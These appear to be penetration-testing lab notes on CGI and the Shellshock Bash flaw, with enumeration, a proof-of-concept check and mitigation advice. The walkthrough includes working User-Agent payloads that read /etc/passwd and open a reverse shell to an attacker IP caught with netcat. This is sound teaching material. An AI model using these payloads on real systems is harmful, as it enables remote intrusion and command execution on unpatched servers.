# Attacking CGI Applications — Shellshock

## What Is CGI?
**Common Gateway Interface (CGI)** lets a web server render dynamic content by handing off requests to external programs — middleware between the web server and other apps/data sources. Scripts live in a `/cgi-bin` directory and can be written in C, C++, Java, Perl, etc. CGI scripts run **in the security context of the web server** and are commonly used for guestbooks, forms, mailing lists, blogs, etc.

**CGI request flow:**
1. Browser sends a URL like `https://acme.com/cgi-bin/newchiscript.pl`
2. Server invokes the CGI script
3. Script runs, produces output
4. Server relays that output back to the browser

**Downsides:** a new process (and often a new DB connection) is spun up per request — high overhead, no caching between loads. CGI has largely been superseded, but still turns up on **embedded devices** and legacy systems.

## The Vulnerability — Shellshock (CVE-2014-6271)
Discovered in 2014, but the underlying bug was **~25 years old** at the time. Affects **GNU Bash up to version 4.3** — a flaw in how Bash parses environment variables containing function definitions.

### Root Cause
Normally, when Bash imports a function stored in an environment variable, execution should stop at the function's closing brace. Vulnerable Bash versions instead **continue executing anything appended after** the function definition.

```bash
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```
- `y='() { :;};` — defines an empty function (does nothing, returns 0)
- `echo vulnerable-shellshock` — appended command, executed **only if the Bash version is vulnerable**

**Patched system output:**
```
not vulnerable
```
(Bash stops at the function boundary — no extra code runs. Patched Bash also requires function definitions in env vars to be prefixed with `BASH_FUNC_`.)

> [!danger] Real-world execution context
> Any command run this way executes as the **web server user** (commonly `www-data`) — a foothold requiring further privilege escalation, though occasionally you'll land as root if the server itself runs elevated.

## Hands-On Walkthrough

### Step 1 — Find a CGI Script (Gobuster)
```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

/access.cgi  (Status: 200) [Size: 0]
```

### Step 2 — Initial Probe
```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Content-Length: 0
```
No visible output — but still worth testing further; a "silent" script can still be vulnerable.

### Step 3 — Confirm Shellshock via User-Agent Header
CGI scripts commonly pass HTTP headers (like `User-Agent`) into environment variables — this is the classic Shellshock injection point.

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
Returns the full contents of `/etc/passwd` → **confirms the vulnerability**.

### Step 4 — Exploit to Reverse Shell
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
Catch it with a listener:
```bash
sudo nc -lvnp 7777

connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
www-data@htb:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Shell lands as `www-data` — the typical web-server low-privilege user, ready for further privesc or lateral movement/pivoting.

## Mitigation
- **Update Bash** — the definitive fix (patched versions require the `BASH_FUNC_` prefix for env-var function definitions).
- End-of-life Ubuntu/Debian systems may need a package-manager upgrade first before Bash itself can be patched.
- For IoT/embedded devices where patching isn't possible:
  - Ensure the device isn't internet-exposed
  - Evaluate decommissioning
  - As a stopgap, firewall the host internally — not a real fix, just risk reduction
